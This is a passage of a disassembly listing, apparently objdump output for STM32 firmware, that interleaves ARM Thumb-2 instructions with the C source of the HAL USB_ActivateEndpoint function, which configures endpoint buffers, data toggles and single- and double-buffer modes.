 8006112:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8006116:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800611a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800611e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006122:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006126:	b29b      	uxth	r3, r3
 8006128:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 800612a:	687a      	ldr	r2, [r7, #4]
 800612c:	683b      	ldr	r3, [r7, #0]
 800612e:	781b      	ldrb	r3, [r3, #0]
 8006130:	009b      	lsls	r3, r3, #2
 8006132:	4413      	add	r3, r2
 8006134:	881b      	ldrh	r3, [r3, #0]
 8006136:	b29b      	uxth	r3, r3
 8006138:	b21b      	sxth	r3, r3
 800613a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800613e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006142:	b21a      	sxth	r2, r3
 8006144:	683b      	ldr	r3, [r7, #0]
 8006146:	781b      	ldrb	r3, [r3, #0]
 8006148:	b21b      	sxth	r3, r3
 800614a:	4313      	orrs	r3, r2
 800614c:	b21b      	sxth	r3, r3
 800614e:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 8006152:	687a      	ldr	r2, [r7, #4]
 8006154:	683b      	ldr	r3, [r7, #0]
 8006156:	781b      	ldrb	r3, [r3, #0]
 8006158:	009b      	lsls	r3, r3, #2
 800615a:	441a      	add	r2, r3
 800615c:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 8006160:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006164:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006168:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800616c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006170:	b29b      	uxth	r3, r3
 8006172:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 8006174:	683b      	ldr	r3, [r7, #0]
 8006176:	7b1b      	ldrb	r3, [r3, #12]
 8006178:	2b00      	cmp	r3, #0
 800617a:	f040 8178 	bne.w	800646e <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 800617e:	683b      	ldr	r3, [r7, #0]
 8006180:	785b      	ldrb	r3, [r3, #1]
 8006182:	2b00      	cmp	r3, #0
 8006184:	f000 8084 	beq.w	8006290 <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8006188:	687b      	ldr	r3, [r7, #4]
 800618a:	61bb      	str	r3, [r7, #24]
 800618c:	687b      	ldr	r3, [r7, #4]
 800618e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006192:	b29b      	uxth	r3, r3
 8006194:	461a      	mov	r2, r3
 8006196:	69bb      	ldr	r3, [r7, #24]
 8006198:	4413      	add	r3, r2
 800619a:	61bb      	str	r3, [r7, #24]
 800619c:	683b      	ldr	r3, [r7, #0]
 800619e:	781b      	ldrb	r3, [r3, #0]
 80061a0:	00da      	lsls	r2, r3, #3
 80061a2:	69bb      	ldr	r3, [r7, #24]
 80061a4:	4413      	add	r3, r2
 80061a6:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80061aa:	617b      	str	r3, [r7, #20]
 80061ac:	683b      	ldr	r3, [r7, #0]
 80061ae:	88db      	ldrh	r3, [r3, #6]
 80061b0:	085b      	lsrs	r3, r3, #1
 80061b2:	b29b      	uxth	r3, r3
 80061b4:	005b      	lsls	r3, r3, #1
 80061b6:	b29a      	uxth	r2, r3
 80061b8:	697b      	ldr	r3, [r7, #20]
 80061ba:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80061bc:	687a      	ldr	r2, [r7, #4]
 80061be:	683b      	ldr	r3, [r7, #0]
 80061c0:	781b      	ldrb	r3, [r3, #0]
 80061c2:	009b      	lsls	r3, r3, #2
 80061c4:	4413      	add	r3, r2
 80061c6:	881b      	ldrh	r3, [r3, #0]
 80061c8:	827b      	strh	r3, [r7, #18]
 80061ca:	8a7b      	ldrh	r3, [r7, #18]
 80061cc:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80061d0:	2b00      	cmp	r3, #0
 80061d2:	d01b      	beq.n	800620c <USB_ActivateEndpoint+0x180>
 80061d4:	687a      	ldr	r2, [r7, #4]
 80061d6:	683b      	ldr	r3, [r7, #0]
 80061d8:	781b      	ldrb	r3, [r3, #0]
 80061da:	009b      	lsls	r3, r3, #2
 80061dc:	4413      	add	r3, r2
 80061de:	881b      	ldrh	r3, [r3, #0]
 80061e0:	b29b      	uxth	r3, r3
 80061e2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80061e6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80061ea:	823b      	strh	r3, [r7, #16]
 80061ec:	687a      	ldr	r2, [r7, #4]
 80061ee:	683b      	ldr	r3, [r7, #0]
 80061f0:	781b      	ldrb	r3, [r3, #0]
 80061f2:	009b      	lsls	r3, r3, #2
 80061f4:	441a      	add	r2, r3
 80061f6:	8a3b      	ldrh	r3, [r7, #16]
 80061f8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80061fc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006200:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006204:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006208:	b29b      	uxth	r3, r3
 800620a:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 800620c:	683b      	ldr	r3, [r7, #0]
 800620e:	78db      	ldrb	r3, [r3, #3]
 8006210:	2b01      	cmp	r3, #1
 8006212:	d020      	beq.n	8006256 <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8006214:	687a      	ldr	r2, [r7, #4]
 8006216:	683b      	ldr	r3, [r7, #0]
 8006218:	781b      	ldrb	r3, [r3, #0]
 800621a:	009b      	lsls	r3, r3, #2
 800621c:	4413      	add	r3, r2
 800621e:	881b      	ldrh	r3, [r3, #0]
 8006220:	b29b      	uxth	r3, r3
 8006222:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006226:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800622a:	81bb      	strh	r3, [r7, #12]
 800622c:	89bb      	ldrh	r3, [r7, #12]
 800622e:	f083 0320 	eor.w	r3, r3, #32
 8006232:	81bb      	strh	r3, [r7, #12]
 8006234:	687a      	ldr	r2, [r7, #4]
 8006236:	683b      	ldr	r3, [r7, #0]
 8006238:	781b      	ldrb	r3, [r3, #0]
 800623a:	009b      	lsls	r3, r3, #2
 800623c:	441a      	add	r2, r3
 800623e:	89bb      	ldrh	r3, [r7, #12]
 8006240:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006244:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006248:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800624c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006250:	b29b      	uxth	r3, r3
 8006252:	8013      	strh	r3, [r2, #0]
 8006254:	e2d5      	b.n	8006802 <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006256:	687a      	ldr	r2, [r7, #4]
 8006258:	683b      	ldr	r3, [r7, #0]
 800625a:	781b      	ldrb	r3, [r3, #0]
 800625c:	009b      	lsls	r3, r3, #2
 800625e:	4413      	add	r3, r2
 8006260:	881b      	ldrh	r3, [r3, #0]
 8006262:	b29b      	uxth	r3, r3
 8006264:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006268:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800626c:	81fb      	strh	r3, [r7, #14]
 800626e:	687a      	ldr	r2, [r7, #4]
 8006270:	683b      	ldr	r3, [r7, #0]
 8006272:	781b      	ldrb	r3, [r3, #0]
 8006274:	009b      	lsls	r3, r3, #2
 8006276:	441a      	add	r2, r3
 8006278:	89fb      	ldrh	r3, [r7, #14]
 800627a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800627e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006282:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006286:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800628a:	b29b      	uxth	r3, r3
 800628c:	8013      	strh	r3, [r2, #0]
 800628e:	e2b8      	b.n	8006802 <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8006290:	687b      	ldr	r3, [r7, #4]
 8006292:	633b      	str	r3, [r7, #48]	; 0x30
 8006294:	687b      	ldr	r3, [r7, #4]
 8006296:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800629a:	b29b      	uxth	r3, r3
 800629c:	461a      	mov	r2, r3
 800629e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80062a0:	4413      	add	r3, r2
 80062a2:	633b      	str	r3, [r7, #48]	; 0x30
 80062a4:	683b      	ldr	r3, [r7, #0]
 80062a6:	781b      	ldrb	r3, [r3, #0]
 80062a8:	00da      	lsls	r2, r3, #3
 80062aa:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80062ac:	4413      	add	r3, r2
 80062ae:	f203 4304 	addw	r3, r3, #1028	; 0x404
 80062b2:	62fb      	str	r3, [r7, #44]	; 0x2c
 80062b4:	683b      	ldr	r3, [r7, #0]
 80062b6:	88db      	ldrh	r3, [r3, #6]
 80062b8:	085b      	lsrs	r3, r3, #1
 80062ba:	b29b      	uxth	r3, r3
 80062bc:	005b      	lsls	r3, r3, #1
 80062be:	b29a      	uxth	r2, r3
 80062c0:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 80062c2:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 80062c4:	687b      	ldr	r3, [r7, #4]
 80062c6:	62bb      	str	r3, [r7, #40]	; 0x28
 80062c8:	687b      	ldr	r3, [r7, #4]
 80062ca:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80062ce:	b29b      	uxth	r3, r3
 80062d0:	461a      	mov	r2, r3
 80062d2:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80062d4:	4413      	add	r3, r2
 80062d6:	62bb      	str	r3, [r7, #40]	; 0x28
 80062d8:	683b      	ldr	r3, [r7, #0]
 80062da:	781b      	ldrb	r3, [r3, #0]
 80062dc:	00da      	lsls	r2, r3, #3
 80062de:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80062e0:	4413      	add	r3, r2
 80062e2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80062e6:	627b      	str	r3, [r7, #36]	; 0x24
 80062e8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80062ea:	881b      	ldrh	r3, [r3, #0]
 80062ec:	b29b      	uxth	r3, r3
 80062ee:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80062f2:	b29a      	uxth	r2, r3
 80062f4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80062f6:	801a      	strh	r2, [r3, #0]
 80062f8:	683b      	ldr	r3, [r7, #0]
 80062fa:	691b      	ldr	r3, [r3, #16]
 80062fc:	2b3e      	cmp	r3, #62	; 0x3e
 80062fe:	d91d      	bls.n	800633c <USB_ActivateEndpoint+0x2b0>
 8006300:	683b      	ldr	r3, [r7, #0]
 8006302:	691b      	ldr	r3, [r3, #16]
 8006304:	095b      	lsrs	r3, r3, #5
 8006306:	66bb      	str	r3, [r7, #104]	; 0x68
 8006308:	683b      	ldr	r3, [r7, #0]
 800630a:	691b      	ldr	r3, [r3, #16]
 800630c:	f003 031f 	and.w	r3, r3, #31
 8006310:	2b00      	cmp	r3, #0
 8006312:	d102      	bne.n	800631a <USB_ActivateEndpoint+0x28e>
 8006314:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006316:	3b01      	subs	r3, #1
 8006318:	66bb      	str	r3, [r7, #104]	; 0x68
 800631a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800631c:	881b      	ldrh	r3, [r3, #0]
 800631e:	b29a      	uxth	r2, r3
 8006320:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006322:	b29b      	uxth	r3, r3
 8006324:	029b      	lsls	r3, r3, #10
 8006326:	b29b      	uxth	r3, r3
 8006328:	4313      	orrs	r3, r2
 800632a:	b29b      	uxth	r3, r3
 800632c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006330:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006334:	b29a      	uxth	r2, r3
 8006336:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006338:	801a      	strh	r2, [r3, #0]
 800633a:	e026      	b.n	800638a <USB_ActivateEndpoint+0x2fe>
 800633c:	683b      	ldr	r3, [r7, #0]
 800633e:	691b      	ldr	r3, [r3, #16]
 8006340:	2b00      	cmp	r3, #0
 8006342:	d10a      	bne.n	800635a <USB_ActivateEndpoint+0x2ce>
 8006344:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006346:	881b      	ldrh	r3, [r3, #0]
 8006348:	b29b      	uxth	r3, r3
 800634a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800634e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006352:	b29a      	uxth	r2, r3
 8006354:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006356:	801a      	strh	r2, [r3, #0]
 8006358:	e017      	b.n	800638a <USB_ActivateEndpoint+0x2fe>
 800635a:	683b      	ldr	r3, [r7, #0]
 800635c:	691b      	ldr	r3, [r3, #16]
 800635e:	085b      	lsrs	r3, r3, #1
 8006360:	66bb      	str	r3, [r7, #104]	; 0x68
 8006362:	683b      	ldr	r3, [r7, #0]
 8006364:	691b      	ldr	r3, [r3, #16]
 8006366:	f003 0301 	and.w	r3, r3, #1
 800636a:	2b00      	cmp	r3, #0
 800636c:	d002      	beq.n	8006374 <USB_ActivateEndpoint+0x2e8>
 800636e:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006370:	3301      	adds	r3, #1
 8006372:	66bb      	str	r3, [r7, #104]	; 0x68
 8006374:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006376:	881b      	ldrh	r3, [r3, #0]
 8006378:	b29a      	uxth	r2, r3
 800637a:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800637c:	b29b      	uxth	r3, r3
 800637e:	029b      	lsls	r3, r3, #10
 8006380:	b29b      	uxth	r3, r3
 8006382:	4313      	orrs	r3, r2
 8006384:	b29a      	uxth	r2, r3
 8006386:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006388:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800638a:	687a      	ldr	r2, [r7, #4]
 800638c:	683b      	ldr	r3, [r7, #0]
 800638e:	781b      	ldrb	r3, [r3, #0]
 8006390:	009b      	lsls	r3, r3, #2
 8006392:	4413      	add	r3, r2
 8006394:	881b      	ldrh	r3, [r3, #0]
 8006396:	847b      	strh	r3, [r7, #34]	; 0x22
 8006398:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 800639a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800639e:	2b00      	cmp	r3, #0
 80063a0:	d01b      	beq.n	80063da <USB_ActivateEndpoint+0x34e>
 80063a2:	687a      	ldr	r2, [r7, #4]
 80063a4:	683b      	ldr	r3, [r7, #0]
 80063a6:	781b      	ldrb	r3, [r3, #0]
 80063a8:	009b      	lsls	r3, r3, #2
 80063aa:	4413      	add	r3, r2
 80063ac:	881b      	ldrh	r3, [r3, #0]
 80063ae:	b29b      	uxth	r3, r3
 80063b0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80063b4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80063b8:	843b      	strh	r3, [r7, #32]
 80063ba:	687a      	ldr	r2, [r7, #4]
 80063bc:	683b      	ldr	r3, [r7, #0]
 80063be:	781b      	ldrb	r3, [r3, #0]
 80063c0:	009b      	lsls	r3, r3, #2
 80063c2:	441a      	add	r2, r3
 80063c4:	8c3b      	ldrh	r3, [r7, #32]
 80063c6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80063ca:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80063ce:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80063d2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80063d6:	b29b      	uxth	r3, r3
 80063d8:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 80063da:	683b      	ldr	r3, [r7, #0]
 80063dc:	781b      	ldrb	r3, [r3, #0]
 80063de:	2b00      	cmp	r3, #0
 80063e0:	d124      	bne.n	800642c <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80063e2:	687a      	ldr	r2, [r7, #4]
 80063e4:	683b      	ldr	r3, [r7, #0]
 80063e6:	781b      	ldrb	r3, [r3, #0]
 80063e8:	009b      	lsls	r3, r3, #2
 80063ea:	4413      	add	r3, r2
 80063ec:	881b      	ldrh	r3, [r3, #0]
 80063ee:	b29b      	uxth	r3, r3
 80063f0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80063f4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80063f8:	83bb      	strh	r3, [r7, #28]
 80063fa:	8bbb      	ldrh	r3, [r7, #28]
 80063fc:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006400:	83bb      	strh	r3, [r7, #28]
 8006402:	8bbb      	ldrh	r3, [r7, #28]
 8006404:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006408:	83bb      	strh	r3, [r7, #28]
 800640a:	687a      	ldr	r2, [r7, #4]
 800640c:	683b      	ldr	r3, [r7, #0]
 800640e:	781b      	ldrb	r3, [r3, #0]
 8006410:	009b      	lsls	r3, r3, #2
 8006412:	441a      	add	r2, r3
 8006414:	8bbb      	ldrh	r3, [r7, #28]
 8006416:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800641a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800641e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006422:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006426:	b29b      	uxth	r3, r3
 8006428:	8013      	strh	r3, [r2, #0]
 800642a:	e1ea      	b.n	8006802 <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 800642c:	687a      	ldr	r2, [r7, #4]
 800642e:	683b      	ldr	r3, [r7, #0]
 8006430:	781b      	ldrb	r3, [r3, #0]
 8006432:	009b      	lsls	r3, r3, #2
 8006434:	4413      	add	r3, r2
 8006436:	881b      	ldrh	r3, [r3, #0]
 8006438:	b29b      	uxth	r3, r3
 800643a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800643e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006442:	83fb      	strh	r3, [r7, #30]
 8006444:	8bfb      	ldrh	r3, [r7, #30]
 8006446:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800644a:	83fb      	strh	r3, [r7, #30]
 800644c:	687a      	ldr	r2, [r7, #4]
 800644e:	683b      	ldr	r3, [r7, #0]
 8006450:	781b      	ldrb	r3, [r3, #0]
 8006452:	009b      	lsls	r3, r3, #2
 8006454:	441a      	add	r2, r3
 8006456:	8bfb      	ldrh	r3, [r7, #30]
 8006458:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800645c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006460:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006464:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006468:	b29b      	uxth	r3, r3
 800646a:	8013      	strh	r3, [r2, #0]
 800646c:	e1c9      	b.n	8006802 <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 800646e:	683b      	ldr	r3, [r7, #0]
 8006470:	78db      	ldrb	r3, [r3, #3]
 8006472:	2b02      	cmp	r3, #2
 8006474:	d11e      	bne.n	80064b4 <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006476:	687a      	ldr	r2, [r7, #4]
 8006478:	683b      	ldr	r3, [r7, #0]
 800647a:	781b      	ldrb	r3, [r3, #0]
 800647c:	009b      	lsls	r3, r3, #2
 800647e:	4413      	add	r3, r2
 8006480:	881b      	ldrh	r3, [r3, #0]
 8006482:	b29b      	uxth	r3, r3
 8006484:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006488:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800648c:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 8006490:	687a      	ldr	r2, [r7, #4]
 8006492:	683b      	ldr	r3, [r7, #0]
 8006494:	781b      	ldrb	r3, [r3, #0]
 8006496:	009b      	lsls	r3, r3, #2
 8006498:	441a      	add	r2, r3
 800649a:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 800649e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064a2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064a6:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 80064aa:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064ae:	b29b      	uxth	r3, r3
 80064b0:	8013      	strh	r3, [r2, #0]
 80064b2:	e01d      	b.n	80064f0 <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 80064b4:	687a      	ldr	r2, [r7, #4]
 80064b6:	683b      	ldr	r3, [r7, #0]
 80064b8:	781b      	ldrb	r3, [r3, #0]
 80064ba:	009b      	lsls	r3, r3, #2
 80064bc:	4413      	add	r3, r2
 80064be:	881b      	ldrh	r3, [r3, #0]
 80064c0:	b29b      	uxth	r3, r3
 80064c2:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 80064c6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064ca:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 80064ce:	687a      	ldr	r2, [r7, #4]
 80064d0:	683b      	ldr	r3, [r7, #0]
 80064d2:	781b      	ldrb	r3, [r3, #0]
 80064d4:	009b      	lsls	r3, r3, #2
 80064d6:	441a      	add	r2, r3
 80064d8:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 80064dc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064e0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064e4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80064e8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064ec:	b29b      	uxth	r3, r3
 80064ee:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 80064f0:	687b      	ldr	r3, [r7, #4]
 80064f2:	65fb      	str	r3, [r7, #92]	; 0x5c
 80064f4:	687b      	ldr	r3, [r7, #4]
 80064f6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80064fa:	b29b      	uxth	r3, r3
 80064fc:	461a      	mov	r2, r3
 80064fe:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006500:	4413      	add	r3, r2
 8006502:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006504:	683b      	ldr	r3, [r7, #0]
 8006506:	781b      	ldrb	r3, [r3, #0]
 8006508:	00da      	lsls	r2, r3, #3
 800650a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800650c:	4413      	add	r3, r2
 800650e:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8006512:	65bb      	str	r3, [r7, #88]	; 0x58
 8006514:	683b      	ldr	r3, [r7, #0]
 8006516:	891b      	ldrh	r3, [r3, #8]
 8006518:	085b      	lsrs	r3, r3, #1
 800651a:	b29b      	uxth	r3, r3
 800651c:	005b      	lsls	r3, r3, #1
 800651e:	b29a      	uxth	r2, r3
 8006520:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8006522:	801a      	strh	r2, [r3, #0]
 8006524:	687b      	ldr	r3, [r7, #4]
 8006526:	657b      	str	r3, [r7, #84]	; 0x54
 8006528:	687b      	ldr	r3, [r7, #4]
 800652a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800652e:	b29b      	uxth	r3, r3
 8006530:	461a      	mov	r2, r3
 8006532:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8006534:	4413      	add	r3, r2
 8006536:	657b      	str	r3, [r7, #84]	; 0x54
 8006538:	683b      	ldr	r3, [r7, #0]
 800653a:	781b      	ldrb	r3, [r3, #0]
 800653c:	00da      	lsls	r2, r3, #3
 800653e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8006540:	4413      	add	r3, r2
 8006542:	f203 4304 	addw	r3, r3, #1028	; 0x404
 8006546:	653b      	str	r3, [r7, #80]	; 0x50
 8006548:	683b      	ldr	r3, [r7, #0]
 800654a:	895b      	ldrh	r3, [r3, #10]
 800654c:	085b      	lsrs	r3, r3, #1
 800654e:	b29b      	uxth	r3, r3
 8006550:	005b      	lsls	r3, r3, #1
 8006552:	b29a      	uxth	r2, r3
 8006554:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8006556:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 8006558:	683b      	ldr	r3, [r7, #0]
 800655a:	785b      	ldrb	r3, [r3, #1]
 800655c:	2b00      	cmp	r3, #0
 800655e:	f040 8093 	bne.w	8006688 <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006562:	687a      	ldr	r2, [r7, #4]
 8006564:	683b      	ldr	r3, [r7, #0]
 8006566:	781b      	ldrb	r3, [r3, #0]
 8006568:	009b      	lsls	r3, r3, #2
 800656a:	4413      	add	r3, r2
 800656c:	881b      	ldrh	r3, [r3, #0]
 800656e:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 8006572:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8006576:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800657a:	2b00      	cmp	r3, #0
 800657c:	d01b      	beq.n	80065b6 <USB_ActivateEndpoint+0x52a>
 800657e:	687a      	ldr	r2, [r7, #4]
 8006580:	683b      	ldr	r3, [r7, #0]
 8006582:	781b      	ldrb	r3, [r3, #0]
 8006584:	009b      	lsls	r3, r3, #2
 8006586:	4413      	add	r3, r2
 8006588:	881b      	ldrh	r3, [r3, #0]
 800658a:	b29b      	uxth	r3, r3
 800658c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006590:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006594:	87fb      	strh	r3, [r7, #62]	; 0x3e
 8006596:	687a      	ldr	r2, [r7, #4]
 8006598:	683b      	ldr	r3, [r7, #0]
 800659a:	781b      	ldrb	r3, [r3, #0]
 800659c:	009b      	lsls	r3, r3, #2
 800659e:	441a      	add	r2, r3
 80065a0:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 80065a2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065a6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065aa:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80065ae:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80065b2:	b29b      	uxth	r3, r3
 80065b4:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80065b6:	687a      	ldr	r2, [r7, #4]
 80065b8:	683b      	ldr	r3, [r7, #0]
 80065ba:	781b      	ldrb	r3, [r3, #0]
 80065bc:	009b      	lsls	r3, r3, #2
 80065be:	4413      	add	r3, r2
 80065c0:	881b      	ldrh	r3, [r3, #0]
 80065c2:	87bb      	strh	r3, [r7, #60]	; 0x3c
 80065c4:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 80065c6:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80065ca:	2b00      	cmp	r3, #0
 80065cc:	d01b      	beq.n	8006606 <USB_ActivateEndpoint+0x57a>
 80065ce:	687a      	ldr	r2, [r7, #4]
 80065d0:	683b      	ldr	r3, [r7, #0]
 80065d2:	781b      	ldrb	r3, [r3, #0]
 80065d4:	009b      	lsls	r3, r3, #2
 80065d6:	4413      	add	r3, r2
 80065d8:	881b      	ldrh	r3, [r3, #0]
 80065da:	b29b      	uxth	r3, r3
